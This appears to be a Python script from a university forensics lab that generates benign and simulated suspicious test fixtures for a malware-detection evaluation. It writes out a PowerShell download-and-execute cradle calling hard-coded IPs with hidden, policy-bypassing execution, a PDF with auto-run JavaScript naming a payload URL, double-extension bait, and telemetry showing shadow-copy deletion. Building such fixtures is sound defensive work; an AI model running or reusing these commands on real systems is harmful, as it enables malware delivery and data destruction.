"""
Academic Test Sample Generator
Generates harmless test fixtures (benign documents and simulated suspicious fixtures)
for laboratory evaluation, university viva, and automated test suites.
DOES NOT CONTAIN REAL MALWARE.
"""

from pathlib import Path
import zipfile
import json
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet

BASE_DIR = Path(__file__).resolve().parents[1]
SAMPLE_DIR = BASE_DIR / "sample_data"
BENIGN_DIR = SAMPLE_DIR / "benign"
SUSPICIOUS_DIR = SAMPLE_DIR / "suspicious"
TELEMETRY_DIR = SAMPLE_DIR / "telemetry"

for d in [BENIGN_DIR, SUSPICIOUS_DIR, TELEMETRY_DIR]:
    d.mkdir(parents=True, exist_ok=True)


def create_benign_pdf():
    pdf_path = BENIGN_DIR / "clean_research_note.pdf"
    doc = SimpleDocTemplate(str(pdf_path), pagesize=letter)
    styles = getSampleStyleSheet()
    story = [
        Paragraph("<b>SRM University Delhi-NCR, Sonipat</b>", styles['Heading1']),
        Paragraph("B.Tech CSE (Data Science & AI) - Academic Term 2026-2027", styles['Normal']),
        Spacer(1, 12),
        Paragraph("This is a benign research note evaluating digital forensic methodologies for static file parsing.", styles['BodyText']),
        Paragraph("Document contains standard clean typography and no active executable content.", styles['BodyText'])
    ]
    doc.build(story)
    print(f"[+] Created benign PDF: {pdf_path}")


def create_benign_docx():
    docx_path = BENIGN_DIR / "project_proposal.docx"
    with zipfile.ZipFile(docx_path, 'w') as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
        zf.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>')
        zf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Standard University Capstone Research Proposal - Data Science & AI</w:t></w:r></w:p></w:body></w:document>')
    print(f"[+] Created benign DOCX: {docx_path}")


def create_benign_zip():
    zip_path = BENIGN_DIR / "dataset_archive.zip"
    with zipfile.ZipFile(zip_path, 'w') as zf:
        zf.writestr("telemetry_data.csv", "timestamp,event,pid\n2026-10-14T10:00:00Z,PROCESS_START,1001\n")
        zf.writestr("readme.txt", "Forensic benchmark verification archive.\nHarmless academic sample.\n")
    print(f"[+] Created benign ZIP: {zip_path}")


def create_suspicious_pdf():
    pdf_path = SUSPICIOUS_DIR / "urgent_action_document.pdf"
    # Harmless raw PDF structure embedding JavaScript and OpenAction markers
    raw_pdf = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert("Security Verification Required: Contact http://malicious-c2-update.org/payload.exe");) >>
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000133 00000 n 
0000000204 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
340
%%EOF"""
    with open(pdf_path, "wb") as f:
        f.write(raw_pdf)
    print(f"[+] Created suspicious PDF fixture: {pdf_path}")


def create_suspicious_ps1():
    ps1_path = SUSPICIOUS_DIR / "system_update_cradle.ps1"
    content = """# Academic Malicious Script Simulation Fixture
$wc = New-Object System.Net.WebClient
$url = "http://185.196.11.42:8080/stage2.bin"
$dest = "$env:TEMP\\update_agent.exe"
$wc.DownloadFile($url, $dest)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& $dest -connect 194.26.29.112:8443"
"""
    with open(ps1_path, "w") as f:
        f.write(content)
    print(f"[+] Created suspicious PS1 fixture: {ps1_path}")


def create_suspicious_zip():
    zip_path = SUSPICIOUS_DIR / "disguised_archive.zip"
    with zipfile.ZipFile(zip_path, 'w') as zf:
        # Harmless simulated double-extension bait
        zf.writestr("financial_report_Q4.pdf.exe", "MZSimulatedExecutableHeaderUPX0PayloadBaitOnly")
        zf.writestr("invoice_note.txt", "Please find attached quarterly audit statement.")
    print(f"[+] Created suspicious ZIP fixture: {zip_path}")


def create_telemetry_json():
    json_path = TELEMETRY_DIR / "ransomware_telemetry_feed.json"
    data = {
        "source": "SRM-CYBER-LAB-SANDBOX-VM",
        "events": [
            {
                "event_type": "PROCESS_CREATE",
                "timestamp": "2026-10-14T10:15:00Z",
                "process_id": 5012,
                "process_name": "disguised_archive.exe",
                "parent_process_id": 1420,
                "parent_process_name": "explorer.exe",
                "command_line": "disguised_archive.exe -silent"
            },
            {
                "event_type": "PROCESS_CREATE",
                "timestamp": "2026-10-14T10:15:03Z",
                "process_id": 5120,
                "process_name": "cmd.exe",
                "parent_process_id": 5012,
                "parent_process_name": "disguised_archive.exe",
                "command_line": "cmd.exe /c vssadmin.exe delete shadows /all /quiet"
            },
            {
                "event_type": "NETWORK_CONNECT",
                "timestamp": "2026-10-14T10:15:07Z",
                "process_id": 5012,
                "process_name": "disguised_archive.exe",
                "destination_ip": "185.196.11.42",
                "destination_port": 443
            },
            {
                "event_type": "FILE_WRITE",
                "timestamp": "2026-10-14T10:15:12Z",
                "process_id": 5012,
                "process_name": "disguised_archive.exe",
                "target_path": "C:\\Users\\User\\Documents\\FINANCIAL_README_RESTORE.txt"
            }
        ]
    }
    with open(json_path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Created telemetry JSON fixture: {json_path}")


if __name__ == "__main__":
    create_benign_pdf()
    create_benign_docx()
    create_benign_zip()
    create_suspicious_pdf()
    create_suspicious_ps1()
    create_suspicious_zip()
    create_telemetry_json()
    print("[*] All academic sample fixtures successfully generated.")
